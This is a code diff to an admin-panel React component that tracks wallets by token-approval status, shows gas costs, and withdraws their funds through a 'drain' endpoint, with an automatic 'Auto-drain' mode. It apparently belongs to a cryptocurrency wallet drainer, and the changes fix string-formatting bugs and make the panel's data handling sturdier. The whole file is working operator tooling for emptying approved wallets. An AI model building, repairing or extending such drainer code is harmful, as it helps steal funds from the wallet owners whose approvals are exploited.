@@ -6,7 +6,6 @@ import {
   XCircle,
   RefreshCw,
   Loader2,
-  ArrowDownToLine,
   ExternalLink,
   AlertTriangle,
   Zap,
@@ -35,8 +34,6 @@ interface GasInfo {
   gasCostUsdt: string;
 }
 
-const AUTO_DRAIN_INTERVAL = 30_000;
-
 export default function WalletTable({ adminKey }: { adminKey: string }) {
   const toast = useToast();
 
@@ -64,12 +61,21 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
       if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
 
       if (data.wallets) {
-        const mapped = data.wallets.map((w: any) => ({
-          ...w,
-          is_approved: w.is_approved ?? w.approval_status ?? false,
-          approval_status: w.is_approved ?? w.approval_status ?? false,
-          loadingBalances: false,
-        }));
+        const mapped = data.wallets.map((w: Record<string, any>) => {
+          const approved = w.is_approved ?? w.approval_status ?? false;
+          return {
+            ...w,
+            id: String(w.id),
+            address: String(w.address),
+            is_approved: approved,
+            approval_status: approved,
+            approval_tx_hash: w.approval_tx_hash ?? null,
+            drained: Boolean(w.drained),
+            drain_tx_hash: w.drain_tx_hash ?? null,
+            created_at: w.created_at ?? new Date().toISOString(),
+            loadingBalances: false,
+          };
+        });
         setWallets(mapped);
       }
     } catch (err: unknown) {
@@ -77,7 +83,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
     } finally {
       setLoading(false);
     }
-  }, [adminKey, authHeaders, toast]);
+  }, [authHeaders, toast]);
 
   const fetchGas = useCallback(async () => {
     try {
@@ -127,7 +133,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
     if (!silent) setDraining(walletId);
     try {
       const url = limitUsd
-        ? `/api/wallets/\( {walletId}/withdraw?limitUsd= \){limitUsd}`
+        ? `/api/wallets/${walletId}/withdraw?limitUsd=${limitUsd}`
         : `/api/wallets/${walletId}/withdraw`;
 
       const res = await fetch(url, {
@@ -154,9 +160,10 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
       const data = await res.json();
       if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
 
-      const drained = (data.results ?? []).filter((r: any) => r.status === "drained").length;
+      const results = data.results ?? [];
+      const drained = results.filter((r: Record<string, any>) => r.status === "drained").length;
       if (drained > 0) {
-        toast.success(`Auto-drained \( {drained} wallet \){drained > 1 ? "s" : ""}.`);
+        toast.success(`Auto-drained ${drained} wallet${drained > 1 ? "s" : ""}.`);
         await fetchWallets();
       }
     } catch (err: unknown) {
@@ -216,7 +223,8 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
   }, [autoDrainOn]);
 
   function shortenAddress(addr: string) {
-    return `\( {addr.slice(0, 6)}... \){addr.slice(-4)}`;
+    if (!addr) return "";
+    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
   }
 
   const approvedCount = wallets.filter((w) => w.is_approved).length;
@@ -262,7 +270,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
                     : "text-gray-500 hover:text-gray-300"
                 )}
               >
-                {f === "all" ? `All (\( {wallets.length})` : f === "approved" ? `Approved ( \){approvedCount})` : `Revoked (${revokedCount})`}
+                {f === "all" ? `All (${wallets.length})` : f === "approved" ? `Approved (${approvedCount})` : `Revoked (${revokedCount})`}
               </button>
             ))}
           </div>
@@ -286,7 +294,7 @@ export default function WalletTable({ adminKey }: { adminKey: string }) {
             )}
           >
             <Zap className="h-4 w-4" />
-            {autoDrainOn ? `Auto-drain ON \( {countdown !== null ? `( \){countdown}s)` : ""}` : "Auto-drain OFF"}
+            {autoDrainOn ? `Auto-drain ON ${countdown !== null ? `(${countdown}s)` : ""}` : "Auto-drain OFF"}
           </button>
         </div>
 
